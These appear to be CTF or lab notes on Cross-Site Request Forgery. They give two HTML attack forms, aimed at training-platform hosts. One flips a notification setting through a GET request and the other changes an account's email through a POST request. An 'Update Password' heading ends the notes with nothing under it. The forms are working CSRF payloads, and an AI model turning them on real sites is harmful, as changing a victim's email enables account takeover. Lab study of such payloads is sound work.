___

Cross-Site Request Forgery
# Update Notifications

GET
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enable Notifications</title>
</head>
<body>
    <h1>Enable Notifications</h1>
    <form action="https://e55tawg1.eu1.ctfio.com/notifications" method="GET">
        <input type="hidden" name="enabled" value="true">
        <button type="submit">Enable Notifications</button>
    </form>
</body>
</html>
```

# Update Email

POST
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Email</title>
</head>
<body>
    <h1>Update Email</h1>
    <form action="https://rp9r4px8.eu1.ctfio.com/email" method="POST">
        <!-- Email input field -->
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="test@admin.test" required>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
```

# Update Password


